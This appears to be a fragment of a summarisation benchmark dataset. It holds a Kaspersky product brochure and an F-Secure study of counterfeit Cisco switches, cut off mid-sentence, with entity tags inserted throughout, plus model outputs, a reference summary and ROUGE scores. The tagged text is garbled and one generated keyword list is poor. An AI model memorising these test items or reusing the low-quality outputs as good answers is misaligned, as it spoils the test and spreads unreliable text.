understanding of threat sources and methods \u2022 24/7 Threat Hunting Kaspersky Managed Protection ServiceBased on leading security intelligence and advanced machine learning technologies , [PERSON] the [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack [PERSON] Platform combines network and endpoint data , sandbox and intelligent analysis to correlate incidents , search for Indicators of Compromise and help uncover the most complex targeted attacks . Connecting up of the various pieces of an incident provides a comprehensive view of the entire attack chain , increasing confidence in assigned threat scores and reducing false positives to [CARDINAL] zero . Global reputation , [ORG] Intelligence [ORG] Services and threat statisticsTargeted [ORG] Attack [ORG] AnalyzerEndpoint [ORG] Detectionand Response(EDR)Kaspersky [WORK_OF_ART] SecurityNetwork [WORK_OF_ART] tra(cid:31)cNetwork+KasperskyManaged [WORK_OF_ART] Protection(Active [WORK_OF_ART] Threat [WORK_OF_ART] Hunting)analysisMachine [WORK_OF_ART] Learningdata and events analysisAdvanced [ORG] SandboxingThreat Visualization / Hunting / ReactionHTTP(S)/SMTP / FTP / [ORG] DNS / [ORG] ICAP , endpoint agentsClustering8Response \u2013 helping businesses to recover from attacksOf course , achieving a higher rate of detection is only part of the battle . The best detection technologies are not much use if you do n\u2019t have the tools and expertise needed to respond rapidly to the \u2018 live \u2019 threat that \u2019s potentially damaging your organizationAfter detecting an attack , it \u2019s important to have access to recognized security experts with the skills and experience to help:\u2022 [ORG] Assess and rectify the damage \u2022 Rapidly recover your operations \u2022 Receive actionabale intelligence after Incident Investigation process \u2022 Plan actions to prevent further repeat of the same attack scenariousProduct platform : [ORG] KasperskyAnti [ORG] Targeted [ORG] AttackplatformKaspersky [ORG] Endpoint [ORG] Detection and Response?Forensic DataDiscoverQualifyInvestigateNeutralizeRecoverRelated services : [ORG] Kaspersky [ORG] Cybersecurity ServicesOnce Kaspersky Anti Targeted Attack Platform of other [ORDINAL] 3rd party security solution identifies that your business is being attacked [ORG] the [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and [ORG] Response takes over . It is the next vital component of [ORG] the [ORG] Threat [ORG] Management and [ORG] Defense solution , allows companies to speed up their incident response process and improve the quality of cybersecurity incidents investigation . [PERSON] Kaspersky [PERSON] EDR provides centralized management of incidents across all endpoints on the corporate network \u2013 giving a seamless workflow and integration with network detection via [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack platform . A wide range of automated responses helps avoid the expensive downtime and lost productivity inherent in traditional remediation processes , like wiping and reimaging . By monitoring and controlling a vast range of functions via a single interface , security tasks can be performed more effectively and efficiently \u2013 with no flipping between multiple tools and consoles . [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and [ORG] Response [ORG] delivers:\u2022 [ORG] Advanced [ORG] Detection [ORG] \u2013 [ORG] withMachine [ORG] Learning [ORG] \u2013 [ORG] Targeted [ORG] Attack [ORG] Analyzer ( TAA ) \u2013 creates a baseline of endpoint behavior . This enables a historical record that can be used to discover how a breach occurred\u2022 Proactive Threat Hunting with fast - search , using a centralized database \u2013 plus Indicators of Compromise ( [LOC] IoC ) search to help security team actively hunt for threats \u2013 proactively scanning endpoints to spot anomalies and security breaches\u2022 Adaptive Threat Response which includes a vast array of automated responses that help enterprises to avoid the use of traditional remediation processes \u2013 such as wiping and reimaging \u2013 that can result in expensive downtime and loss of productivity9PreventionAdvanced [PERSON] ResponceThreat [PERSON] HuntingKill processDelete objectQuarantine / RecoverPreventRun a script / programFull visibility and accurate detection are only a part of the battle . The very nature of targeted attacks means that attackers will come back with new tools and techniques . If an emergency occurs , the cybersecurity team might need a trusted partner with the relevant skills and experience , as well as honing in - house skills . Our Incident Response Service includes:\u2022 Incident assessment . Initial analysis of an incident \u2013 rapidly delivered to helpyou minimize the damage to your business ( the analysis can be performed on- site or remotely)\u2022 Evidence collection . For example , gathering hard disk drive images , memorydumps , network traces and other information that \u2019s relevant to the incident\u2022 Forensic analysis . Detailed analysis to help establish information about : \u2013 What was attacked \u2013 Who carried out the attack \u2013 The period during which your business was attacked \u2013 Where the attack originated \u2013 Why your business was attacked \u2013 How the attack was implemented\u2022 [ORG] Malware analysis . Detailed analysis of malware that was used as part of the attack.\u2022 Remediation plan . A detailed plan that will help your business to prevent themalware propagating across more of your network \u2013 plus help you create an uninstallation plan.\u2022 Investigation report . A detailed report that includes information aboutthe incident investigation and remediation . If your own security team is able to carry out many of the incident response tasks , you may wish to use [CARDINAL] one of our other services:\u2022 [ORG] Malware [ORG] Analysis [ORG] Service \u2013 subjects the malware your team has isolatedto detailed analysis.\u2022 [ORG] Digital [ORG] Forensics [ORG] Service \u2013 analyzes digital evidence & incident effectsgathered by your team.10Prediction \u2013 doing more to guard against future threatsWith the threat landscape constantly changing , your security strategy must continually evolve to meet new challenges . Security is n\u2019t a \u2018 [CARDINAL] one - off activity \u2019 \u2013 it \u2019s an ongoing process that calls for continuous assessment of:\u2022 The latest threats \u2022 The effectiveness of your IT security \u2026 so your business can adapt to new risks and changing demands . [ORG] Global [ORG] Threat [ORG] Intelligence [ORG] Access with [PERSON] Kaspersky [PERSON] LabIntelligence with a GlobalReach Providingthe BroadestAttack VisibilityA Providerwith a Track Recordin Spotting New Threat IndicatorsEarlyContext - rich , and [ORG] Mechanismsthat [ORG] AllowEasy Integrationinto ExistingSecurity ControlsHaving access to experts that can keep you updated on the global threat landscape \u2013 and help you to test your systems and your existing defenses \u2013 is a vital element in helping your organization to adapt and keep pace with new security threats . Over [DATE] the [DATE] years , our global security experts have amassed a vast amount of knowledge about how advanced and targeted attacks work \u2013 and we \u2019re constantly analyzing new attack techniques . This hard - won expertise means we \u2019re uniquely placed to predict new attack methods and help you to be ready to combat them . In addition , we can offer specialized services to help you \u2018 harden \u2019 your IT infrastructure:\u2022 Penetration Testing Services \u2013 to help you assess the effectiveness of yourcurrent security [ORG] provisions\u2022 [ORG] Application [ORG] Security [ORG] Assessment [ORG] Services \u2013 to help you find softwarevulnerabilities \u2026 before the cybercriminals do\u2022 [PERSON] Advanced [PERSON] Cybersecurity Training \u2013 to help train your own experts and build\u2022your own [ORG] Security [ORG] Operations [ORG] Center [ORG] Intelligence [ORG] Reporting and Customized Threat Reporting \u2013 to help keep you updated on [DATE] today \u2019s constantly changing threat landscape\u2022 [ORG] Threat [ORG] Lookup portal \u2013 access to [PERSON] Kaspersky [PERSON] Lab intelligence global databaseto help [PERSON] Empower your malware researches11Kaspersky [ORG] Adaptive [ORG] Security [ORG] Strategy founded on the most viable security architecture described by [PERSON] Gartner . [PERSON] Kaspersky [PERSON] Lab approach providing cycle of activities in [CARDINAL] four key areas : Prevent , [GPE] Detect , [PERSON] Respond , and Predict . Essentially , it assumes that traditional prevention systems should function in connection with detection technologies , threat analytics , response capabilities and predictive security techniques . This helps to create a cybersecurity system that continuously adapts and responds to the emerging enterprise challenges . [PERSON] Adopting [PERSON] Kaspersky [PERSON] Lab \u2019s [PERSON] Threat [PERSON] Management and Defense solution means:1 . Moving from from a reactive security model to a proactive model based onrisk management , continuous monitoring , more informed incident response and threat hunting capabilities2 . Your operational framework streamlines day - to - day security processes andboosts security effectiveness through a multi - layered defense model that prevents and detects advanced threats at each stage of the attack.3 . [CARDINAL] One integrated platform reduces the security alerts that overwhelm mostsecurity teams by providing threat intelligence - based context and prioritization to alerts as well as improving tactical responses by sharing threats knowledge , deep expertise and providing security intelligence services.4 . This environment provides security analysts with visibility of all attack stages in a unified way , enabling seamless threat analysis and confident investigation of both known and unknown threats before they impact the business.5 . [ORG] Global [ORG] Threat [ORG] Intelligence sharing through [ORG] APT and threat intelligence portalsprovides unique proactive insights into the motives and intentions of your adversaries , so you can prioritize policies and security investment planning accordingly . A world of expertise in [PERSON] Kaspersky [PERSON] Lab TechnologiesThe effectiveness of [PERSON] Kaspersky [PERSON] Lab products is proven on a regular basis by the results of independent testing . In [DATE] 2015 , the company headed the Top [CARDINAL] 3 rating of security solution manufacturers . According to the results of [CARDINAL] 84 different tests performed by respected test organizations in several countries , [PERSON] Kaspersky [PERSON] Lab solutions finished in the Top 3 in 82 % of tests and topped the rating on [CARDINAL] 60 occasions . This is undeniable proof that [PERSON] Kaspersky [PERSON] Lab provides the industry \u2019s best protection.12Proven solution against advanced threatsDuring [DATE] 2017 , our [PERSON] Kaspersky [PERSON] Anti - [PERSON] Targeted Attack Platform ( as a part of [ORG] Threat [ORG] Management and Defense solution ) has continued participate in ICSA Lab tests . The latest tests lasted for [DATE] 37 [DATE] days and consisted of [CARDINAL] 585 attacks and [CARDINAL] 519 clean files . KATA demonstrated excellent [CARDINAL] results:\u2022 Perfect detection rate \u2013 [PERCENT] 100 % ( [GPE] ZERO missed samples ) \u2022 Lowest possible false positive rate \u2013 0 % \u2022 Achieved \u2018 Certified \u2019 statusHere are a few quotes from the resulting report issued by [ORG] ICSA on [ORDINAL] 7th July:\u2022 \u2022\u2022\u2022\u2022\u2022\u2018Kaspersky \u2019s solution did remarkably well during this test cycle \u2019 \u2018 [WORK_OF_ART] The [WORK_OF_ART] Kaspersky [WORK_OF_ART] Lab [WORK_OF_ART] KATA platform detected 100.0 % of the threats it encountered during testing , considerably better than the percentage required for certification . \u2019 \u2018 Kaspersky Labs \u2019 KATA demonstrated excellent threat detection effectiveness against [CARDINAL] nearly [CARDINAL] 600 new and little - known threats . \u2019 \u2018 Regardless of how new or how old the threat , the Kaspersky KATA platform detected all new and little - known malicious threats . \u2019 \u2018 The Kaspersky KATA platform had [CARDINAL] zero false positives during this test cycle , which is excellent . \u2019 \u2018 Kaspersky Labs \u2019 KATA advanced threat defense solution passed all the test cases to retain ICSA Labs Advanced Threat Defense Certification . Successful completion of this test cycle marks [PERSON] Kaspersky [PERSON] Labs [DATE] \u2019 [DATE] 3rd [DATE] consecutive [DATE] quarter having met the ICSA Labs ATD certification testing criteria . \u2019NOTE : ICSA testing methodology is dynamic and changes from [DATE] quarter [DATE] to [DATE] quarter . The test itself is a continuously evolving simulation of a real environment and attack methods . The level of security is not measured at [CARDINAL] one given moment but over an extensive period ( [DATE] more [DATE] than [DATE] 30 [DATE] days ) of continuous operation under numerous attacks . In this way , the test aims to showcase the efficiency and effectiveness of a solution from a user standpoint . [PERSON] Visionaire and comprehensive approachFor [DATE] several [DATE] years [ORG] Radicati [ORG] Group doing an independent analysis of the Market for [ORG] APT [ORG] Protection [ORG] Solutions [ORG] Revealing [ORG] Top [ORG] Players , [PERSON] Trail [PERSON] Blazers , Specialists and Mature Players . In the result of the market analysis , which just released , [PERSON] Kaspersky [PERSON] Lab \u2019s approach of countering targeted attacks and advanced threats were evaluated with an excellent side . In [DATE] 2017 Kaspersky solution significantly improved its position with a major move from Specialists to [ORG] Trail [ORG] Blazering leader . [ORG] Trail [ORG] Blazing vendors offer advanced , best of breed technology , in some areas of their solutions , but do n\u2019t necessarily have all the features and functionality that would position them as Top Players . [PERSON] Trail [PERSON] Blazers , however , have the potential for \u201c disrupting \u201d the market with new technology or new delivery models . In time , these vendors are most likely to grow into Top Players . \u00abThe [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted Attack Platform provides advanced threat and targeted attack detection across all layers of a targeted attack \u2013 initial infection , command and control communications , and lateral movements and data [PERSON] exfiltration\u00bb13Kaspersky [PERSON] Lab [PERSON] Enterprise [PERSON] Cybersecurity : www.kaspersky.com/enterprise Cyber Threats News : www.securelist.com IT Security News : business.kaspersky.com/#truecybersecurity # HuMachinewww.kaspersky.com \u00a9 [DATE] 2018 [PERSON] AO [PERSON] Kaspersky [PERSON] Lab . All rights reserved . Registered trademarks and service marks are the property of their respective owners .", "generated_text": "Threats; advanced persistent threats; APTs; systems; organizations; days; months; years; attacks; the attackers; the breach; the attackers; research; vulnerabilities; the infrastructure; critical reliance; digitalisation; reliance; data; a waiting game; a payload; stolen data; information; the exploit; payloads; the malware; the target; the attackers; passwords; compromise; capabilities; a customer; a market leader; a legitimate employee; number; %; sensitive data; a payload; summary; Kaspersky; advanced persistent threats; threats; the threat landscape.", "ref_text": "<START-1>The document discusses Kaspersky Lab's threat management and defense solution for protecting against advanced cybersecurity threats like targeted attacks and advanced persistent threats (APTs). It provides an overview of the evolving enterprise threat landscape and the rise of sophisticated, professionally executed cyberattacks that traditional security tools often fail to detect. Kaspersky's solution takes an intelligence-driven, adaptive approach to security centered around four key activities: - Prevent - Hardening systems and assets against threats using technologies like anti-malware, firewalls, etc. This filters out common attacks and raises the bar for more advanced threats. - Detect - Using Kaspersky's Anti Targeted Attack Platform and Endpoint Detection and Response tools to provide visibility across the IT infrastructure and uncover even stealthy, complex attacks through advanced analytics and threat intelligence. - Respond - Leveraging Endpoint Detection and Response for rapid automated response and remediation after threats are detected. This avoids costly downtime from traditional wiping and reimaging. Kaspersky's incident response services provide expert forensic analysis and remediation planning. - Predict - Ongoing threat intelligence, training, and testing services to stay ahead of emerging attack methods and adapt defenses accordingly. This proactive security helps address future risks. Overall, Kaspersky takes a layered, adaptive approach to security, combining traditional prevention tools with advanced detection, automated response capabilities, and predictive security powered by threat intelligence. This intelligence-driven model aims to provide comprehensive protection across the entire attack chain. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.326923076923077, "gpt3/lexical/rouge_rouge2": 0.033816425120772944, "gpt3/lexical/rouge_rougeL": 0.16826923076923075, "gpt3/lexical/rouge_rougeLsum": 0.16826923076923075, "gpt3_generated_text": ["The article discusses the growing risk of advanced threats and targeted attacks, specifically advanced persistent threats (APTs), to enterprise systems. It highlights that many organizations are relying on outdated security technologies and mindset to protect against these evolving threats. APTs can go undetected for weeks, months, or even years as the attackers gather information and exploit vulnerabilities in their chosen targets' systems. The article also mentions the factors contributing to successful breaches, such as hidden and shadow IT, uncontrolled connectivity of IoT devices, and lack of preventive capabilities. It emphasizes that every corporation, including smaller businesses, is a potential target, and the odds of becoming a victim increase for market leaders. The attackers include cybercriminals, competitor businesses, cyber-mercenaries, hacktivists, and government agencies. The risks to organizations include unauthorized transactions, data theft or corruption, process manipulation, and identity theft. The article provides specific risks for key industry sectors such as financial services, government, manufacturing and high technology, telecommunications, energy and utilities, and mass media. Overall, the article highlights the need for organizations to be proactive in their cybersecurity measures to protect against these advanced persistent threats."]}, {"split_name": "test", "sample_id": "test_104", "prompt_text": "Extract the keywords: [ORG] PUBLICTHE [ORG] FAKE [ORG] CISCOHunting for backdoors in [GPE] Counterfeit [GPE] Cisco devicesDmitry JanushkevichF - [ORG] Secure [ORG] Consulting , [ORG] Hardware [ORG] Security TeamVersion 1.0 , July 2020F-Secure.com | \u00a9 F - Secure LABS0PUBLIC1 INTRODUCTIONProducing counterfeit products is , and always has been , a great business if you do n't mind being on the wrong side of the law . There \u2019s no need to invest in a costly R&D process , and no need to select the best performing and looking materials ; the only criterion is the cost of manufacture . This is why we see many imitations of expensive products on the market , and are likely to continue to see them being made and sold at a fraction of original \u2019s price . Network hardware designed , manufactured , and sold under the [GPE] Cisco brand is a perfect example of this . Having an excellent reputation because of their great engineering , these products sell at a premium price point . Naturally , this encourages some to try and produce counterfeits as it \u2019s a way of making easy money . Stories of such exploits abound in the media : a gang reportedly exporting1 [MONEY] US$ [MONEY] 10 [MONEY] million worth of gear to the [GPE] US , the [ORG] FBI seizing shipments2 of fake hardware , and court rulings being issued3 to stop the manufacturers . What does [GPE] Cisco do to combat fraud ? Actually , a lot . [GPE] Cisco has a dedicated [ORG] Brand [ORG] Protection organization whose purpose is to defend against counterfeit and gray market activities . They partner with customs teams and regional governments all over the world with success . In [DATE] April [DATE] 2019 , they seized $ [MONEY] 626,880 worth of counterfeit [GPE] Cisco products in one day.4 However , despite successful operations [GPE] Cisco has n\u2019t been able to stop fraud fully . If there \u2019s an opportunity to make a fast buck , there \u2019ll always be someone willing to take the risk . In [DATE] fall [DATE] 2019 , an IT company found some network switches failing after a software upgrade . The company would find out later that they had inadvertently procured suspected counterfeit [GPE] Cisco equipment . Counterfeit devices quite often work smoothly for a long time , which makes it hard to detect them . In this particular case , the hardware failure initiated a wider investigation to which [PRODUCT] the F - [PRODUCT] Secure [PRODUCT] Hardware [PRODUCT] Security team was called and asked to analyze the suspected counterfeit [ORG] Cisco [ORG] Catalyst 2960 - X series5 switches . This initiated a research project with the following goals:\u2022 Verify no extra functionality such as \" backdoor access \" was introduced.\u2022 Understand how and why counterfeit devices bypass the platforms authentication security control . Naturally , as it \u2019s not easy to tell genuine and counterfeit devices apart , to verify whether any kind of \" backdoor \" functionality existed was also not easy , as it required a considerable amount of technical investigative work . Ultimately , we concluded , with a reasonable level of confidence , that no backdoors had been introduced . Furthermore , we identified the full exploit chain that allowed [CARDINAL] one of the forged products to function : a previously undocumented vulnerability in a security component which allowed the device \u2019s [PERSON] Secure [PERSON] Boot restrictions to be bypassed . This paper details the process which led to this conclusion and shares the technical knowledge gained during this journey.1 url [CARDINAL] 2 url [CARDINAL] 3 url [CARDINAL] 4 url [CARDINAL] 5 url#~tab - documentsF - Secure.com | \u00a9 F - Secure LABS1PUBLICWhile in this case no \" backdoors \" were identified , the fact the security functions were bypassed means the security posture of the device was weakened . This could allow attackers who have already gained code execution via a network - based attack , for example , an easier way to gain persistence , and therefore impact the security of the whole organization.1.1 AcknowledgementsThis paper is the result of a huge team effort . The author would like to acknowledge [PERSON] Andrea Barisani \u2019s contribution , who was the [ORDINAL] first point of contact for the team and started the initial investigative work . Thanks also go to [PERSON] Daniele [PERSON] Bianco and [PERSON] Andrej [PERSON] Rosano , who worked on the initial investigation . Furthermore , the author would like to thank [PERSON] Thierry [PERSON] Decroix for numerous edits and reviewing this paper.1.2 [ORG] DisclaimerAs this work presents the results of practical research , some of the information that appears may be insufficiently precise or incorrect . Please proceed at your own risk.1.3 Device detailsThe following table details the devices the team had access to . The [PERSON] Genuine device was procured from an authorized distributor and the manufacturer confirmed it was genuine . Device typeNameSW [CARDINAL] versionWS-2960X-48TS - L V05Genuinec2960x - universalk9 - mz.152 - 2.E7WS-2960X-48TS - L V01Counterfeit AWS-2960X-48TS - L V01Counterfeit Bc2960x - universalk9 - mz.150 - 2.EX5 ( as provided by the source)c2960x - universalk9 - mz.152 - 4.E7 ( upgraded , resulting in breakage)The devices will be referred to by their names where required.F-Secure.com | \u00a9 F - Secure LABS2PUBLICCONTENTS1INTRODUCTION [CARDINAL] 1 [CARDINAL] 1.1 Acknowledgements 21.2 Disclaimer [CARDINAL] 21.3 Device details [CARDINAL] 22 [LAW] ANALYSIS [LAW] 4 performed . This also happened to the victim company and the devices had to be replaced . During negotiating the replacement with the vendor , the company found out they had unknowingly bought counterfeit devices . Moreover , the CISO was brought in to initiate investigations as to whether the company \u2019s networks had been compromised . While the device lost its primary function as a network switch when the software upgrade was installed , it could still be accessed via the console . The following message was then displayed on the console during boot:[Date Time ] : % ILET-1 - AUTHENTICATION_FAIL : This [ORG] Switch may not have been manufactured by [GPE] Cisco or with [GPE] Cisco 's authorization . This product may contain software that was copied in violation of [GPE] Cisco 's license terms . If your use of this product is the cause of a support issue , [GPE] Cisco may deny operation of the product , support under your warranty or under a [GPE] Cisco technical support program such as Smartnet . Please contact [GPE] Cisco 's [ORG] Technical [ORG] Assistance [ORG] Center for more information . Reverting the software version did not fix the problem , likely pointing to evidence of data being overwritten during the update process.2.2 Exterior differencesBecause clones and packaging are getting more realistic , many people do n't realize they have counterfeit network equipment until it 's installed and begins acting strangely . However , it is possible to spot minor differences in the visual appearance of the suspected counterfeits through comparison with a known - genuine device . Presented below are the most prominent differences we found during our investigations . Figure [CARDINAL] 1 . The suspected counterfeit switch ( on the left ) has port numbers in bright white , while the known genuine device has them in grey . The text itself is misaligned . The triangles indicating different ports are different shapes.F-Secure.com | \u00a9 F - Secure LABS4PUBLICFigure 2 . The mode button \u2019s shape is slightly different . The square next to the management port is greenish on the counterfeit switch . On the genuine device , it is bright yellow . While immediately recognizing such minute differences may be challenging to spot , side - by - side comparison clearly shows that the enclosures of counterfeit units are of a lesser quality.2.3 Board analysisThe main component of any modern electronics is printed circuit boards ( PCBs ) carrying electronic components such as integrated circuits , connectors , and passive components . By analyzing these boards , we could spot any differences and similarities between devices of the same family in the hope of gaining insight into what modifications were done by the counterfeiters . The overall board layout of the [CARDINAL] three devices was similar , with the [GPE] Genuine unit and [ORG] Counterfeit [ORG] B sharing more similarities in appearance . When observed in detail , however , it was possible to verify modifications for forgery purposes , and the differences are significant . The absence of a holographic sticker on the counterfeit units was immediately noticeable . While its presence on the [PERSON] Genuine unit was not a guarantee of authenticity , its absence typically indicated a counterfeit . Figure [CARDINAL] 3 . Legitimate holographic sticker which was absent on both counterfeit units.F-Secure.com | \u00a9 F - Secure LABS5PUBLICFigure 4 . Genuine unit , internal view.F-Secure.com | \u00a9 F - Secure LABS6PUBLICFigure 5 . Counterfeit A , internal view.F-Secure.com | \u00a9 F - Secure LABS7PUBLICFigure [CARDINAL] 6 . Counterfeit B , internal view.F-Secure.com | \u00a9 F - Secure LABS8PUBLICThe Flash part numbers were found to be different , albeit both identifying [CARDINAL] 1Gbit parallel [PRODUCT] NOR [PRODUCT] Flash devices . The [PERSON] Genuine unit had [ORG] Spansion [ORG] p / n S29GL01GS11TFIV1 installed , while the counterfeit devices were installed with Micron / Intel [ORG] p / n JS28F00AM29EWH . This could be attributed to the fact that the [PERSON] Genuine unit was identified as [FAC] V5 while the counterfeits were V1 . It is hard to say without comparing devices of the same version whether this was an indicator . It could also be the result of the manufacturer swapping in cheaper parts . Figure [CARDINAL] 7 . U8 , an [CARDINAL] 1Gbit [ORG] NOR [ORG] Flash . PCB rework evidence on the [ORG] Counterfeit [ORG] A unit : soldering flux residue on and around the Flash IC is present . What was more concerning , was the presence of PCB rework traces around the Flash IC on the Counterfeit A unit . While it could be the case the unit was legitimately repaired , no record of such activity was found via available sources . This led us to conclude that , at some point , the [PRODUCT] Flash chip had been replaced . This may have been part of legitimate repair activities ; however , it is not typical for legitimate repair shops to leave flux residues on the board.F-Secure.com | \u00a9 F - Secure LABS9PUBLIC2.3.1 COUNTERFEIT ACompared to other units , the main board of the [ORG] Counterfeit [ORG] A unit had by far the biggest number of components installed , as well as completely different [PERSON] Ethernet chips . Judging by that , we recognized the possibility of a [CARDINAL] V1 board , as suggested by the device type sticker located on the enclosure . No irregularities were spotted during the inspection of the top - side components , but a prominent difference was identified on the bottom side . Figure [CARDINAL] 8 . The Counterfeit A processor board had an \" extra \" component added . The component was connected through vias to the pins of [ORG] U55 located on the top side of the board , identified as a [CARDINAL] 512Kbit I2C EEPROM . While [CARDINAL] two wires connected to power rails , [CARDINAL] two connected to pins [CARDINAL] 5 and [CARDINAL] 6 of [ORG] U55 , which carry the I2C [ORG] SCL and [ORG] SDA bus signals . Figure [CARDINAL] 9 . [ORG] U55 , a I2C EEPROM , [GPE] ST p / n M24512 marked 412R8 as found in the Counterfeit A unit.F-Secure.com | \u00a9 F - Secure LABS10PUBLIC2.3.2 COUNTERFEIT BThe Counterfeit B unit was found to have [CARDINAL] one significant difference when compared to other units : the presence of components with their top marking removed with a laser ; the components are [ORG] U55 and U10006.Whereas the same [ORG] U55 component is a serial EEPROM in the TSSOP-8 package in other units , the [ORG] Counterfeit B unit sported a QFN16 package . This could be a legitimate engineering change when producing a new board revision , but it is unusual for an I2C EEPROM to be manufactured in such a package . Furthermore , there is no realistic reason to remove top marking for such a simple part . Figure [CARDINAL] 10 . U55 , an unknown component with top marking removed . The other component with its top marking removed was U10006 , bearing a nondescript top marking even in a genuine unit : [DATE] 1341604 / QQ2Q8 / B1837 . Unfortunately , this made determining the exact function of this component very challenging . Figure [CARDINAL] 11 . U10006 , another component with top marking removed in [PERSON] Counterfeit [PERSON] B. The [ORG] Genuine unit to the right for comparison . Note silkscreen quality was lacking on the counterfeit board.F-Secure.com | \u00a9 F - Secure LABS11PUBLICNote the many similarities in via positioning ; they matched almost exactly and followed almost the same routing for traces connecting to the passive components on the right . However , U10006 was not only rotated , it also appeared to have a different pinout compared to the genuine board . Pin 1 marking was also very different both on silkscreen and the component itself.2.4 [ORG] Boot log acquisition and analysisAny sufficiently sophisticated device needs to have a way to provide an insight for manufacturing engineers and end users into its state as well as enable controlling its functioning . Such a way is usually implemented through some sort of a console , allowing the operator to observe system messages as the device boots and to input commands to control the boot process and device operation in general . Naturally , these messages provide a wealth of useful information when investigating device workings and as such are important to capture . For example , this allowed identification of the software version installed on each device , and was instrumental in obtaining clean images from the vendor for further comparison . Inventory information was also displayed during the boot , mainly consisting of serial numbers for various parts comprising the device . This allowed us to verify the numbers against labels present on each part . While not a direct indication of being counterfeit , a mismatch was indicative of the part being replaced . Probably the most interesting aspect was the analysis of the inoperable device , which failed the platform authentication procedure . From the very start of the boot : CPU rev : B Image passed digital signature verification [ORG] Board rev : 18 Testing Memory from [CARDINAL] 0x00000000 [CARDINAL] to 0x1fffffff / Using driver version [CARDINAL] 4 for media type 1 It is worth noting that the device reported ( some ) digital signature verification passed , even though the boot process resulted in a non - functional device . Similarly:\"flash : c2960x - universalk9 - mz.152 - 4.E7.bin \" Verifying done [PERSON] Initializing [PERSON] Flash . Loading universalk9 - mz.152- 4.E7.bin Image passed digital signature verification [ORG] @@@ [ORG] @@@ [ORG] File \" flash : c2960x - universalk9 - mz.152 - 4.E7.bin \" uncompressed and installed , entry point : 0x3000 executing imageflash : c2960x - Note the [CARDINAL] two - pass loading process , with verification being performed separately.F-Secure.com | \u00a9 F - Secure LABS12PUBLICHowever : done Initializing flashfs . Checking for Bootloader upgrade Boot Loader upgrade not needed(v ) FIPS : Flash Key Check : Begin FIPS : Flash Key Check : End , Not Found , [PERSON] FIPS [PERSON] Mode [PERSON] Not [PERSON] Enabled POST : MA BIST : Begin POST : MA BIST : End , Status Passed POST : TCAM BIST : Begin POST : TCAM BIST : End , Status Passed POST : ACT2 Authentication : Begin POST : ACT2 Authentication : End , [PERSON] Status [PERSON] Failed extracting front_end / front_end_ucode_info ( 43 bytes ) Waiting for Stack Master Election POST : Thermal , Fan Tests : Begin POST : Thermal , Fan Tests : End , [PERSON] Status [PERSON] Passed To summarize , the platform consisting of bootloaders , together with any potential pre - boot mechanisms successfully authenticated the application image . However , the application then failed to authenticate the platform . This seemed to correlate well with the high - level symptoms outlined before , which may have either meant that the software image was patched covertly when loaded , or the patched version was already provisioned ; this would be easy to verify once images had been extracted from the devices.2.5 Content extraction from live systemsThe [GPE] Cisco devices implement advanced management capabilities through the serial console , allowing not only to change the configuration settings but also explore the available file systems . This was leveraged as a non- invasive method of extracting contents \u2013 we did not know in advance whether raw filesystem data extracted from Flash ICs could actually be used with non - Cisco systems , for example , mounted in Linux . This stage followed directly after boot log acquisition , and leveraged the console access to explore , and tried to discover and back - up any interesting files present on the local filesystems . Unless a standard filesystem is used , extracting files from a raw [PERSON] Flash image is usually significantly harder than copying those off the device when it is powered on . The devices store the application software image in a file located in the main flash : file system . Therefore , it was relatively easy to obtain a copy of the software being executed on counterfeit devices . The fact that the units stopped working after a software update , yet still reported the updated version during the boot , can be considered evidence that no hidden software copy was present elsewhere on the [ORG] system.F-Secure.com | \u00a9 F - Secure LABS13PUBLICSwitch # May 11 13:25:40.493 : % USBFLASH-5 - CHANGE : usbflash1 has been inserted ! Switch#dir flash:/ Directory of flash:/ [DATE] 2 [DATE] -rwx [DATE] 1048576 Nov [DATE] 26 [DATE] 2019 15:34:12 +00:00 test [CARDINAL] 3 -rwx [CARDINAL] 4120 Oct [DATE] 3 [DATE] 2019 13:37:32 +00:00 multiple - fs [CARDINAL] 4 drwx [CARDINAL] 512 Jul 4 [DATE] 2014 02:51:46 +00:00 c2960x - universalk9 - mz.150 - 2.EX5 643 drwx [CARDINAL] 512 Jul 4 2014 02:51:47 +00:00 [DATE] dc_profile_dir [DATE] 122185728 bytes total ( [CARDINAL] 97654272 bytes free ) Switch#dir flash:/c2960x - universalk9 - mz.150 - 2.EX5 Directory of flash:/c2960x - universalk9 - mz.150 - 2.EX5/ 5 -rwx 800 Jul [DATE] 4 [DATE] 2014 02:43:35 +00:00 info [CARDINAL] 6 drwx [DATE] 6144 Jul [DATE] 4 [DATE] 2014 02:43:35 +00:00 html [CARDINAL] 642 -rwx 18229248 Jul [DATE] 4 [DATE] 2014 02:45:34 +00:00 c2960x-universalk9-mz.150-2.EX5.bin [DATE] 122185728 bytes total ( [CARDINAL] 97654272 bytes free ) Switch#$copy flash : c2960x - universalk9 - mz.150 - 2.EX5 / mz.150 - 2.EX5 / c2960x - universalk9 - mz.150- 2.EX5.bin usbflash1:/ Destination filename [ c2960x-universalk9-mz.150-2.EX5.bin ] ? CA_c2960x - universalk9 - mz.150- [DATE] 2.EX5.bin [DATE] 18229248 bytes copied in [CARDINAL] 15.103 secs ( 1206995 bytes / sec ) Switch # May 11 13:27:00.622 : % USBFLASH-5 - CHANGE : usbflash1 has been removed!inThe downloaded software image could then be verified from the unit by obtaining a legitimate copy of the same software version from the manufacturer and comparing SHA256 hashes.$ sha256sum CA_c2960x-universalk9-mz.150-2.EX5.bin mz.150 - 2.EX5.binCA_c2960x - universalk9 - The hashes were found to match ; no changes were made to the software image stored on the counterfeit unit . This meant it was highly likely application software was patched in memory after load . However , some information of potential interest is rarely stored in file systems . For example , boot loader programs , or bootloaders , are rarely present there and are typically stored in \" raw \" form directly in Flash memory . The only way to gain access to this code is through extraction of raw [PRODUCT] Flash memory content followed by analysis of whatever content was actually extracted.F-Secure.com | \u00a9 F - Secure LABS14PUBLIC2.6 Direct Flash content extractionAs already noted , the boards sported a prominent parallel [PRODUCT] NOR [PRODUCT] Flash chip of considerable size . This made the chip the prime candidate for storing at least the application part of the overall software package , so was the [ORDINAL] first one to be checked for suspicious traces . All [CARDINAL] three devices underwent the same extraction procedure . [ORDINAL] First , the chips were removed from the boards . Then , [PERSON] Flash content extraction was performed with the [PERSON] Elnec BeeProg2 with [CARDINAL] 70 - 3170 TSOP56 adapter , using the 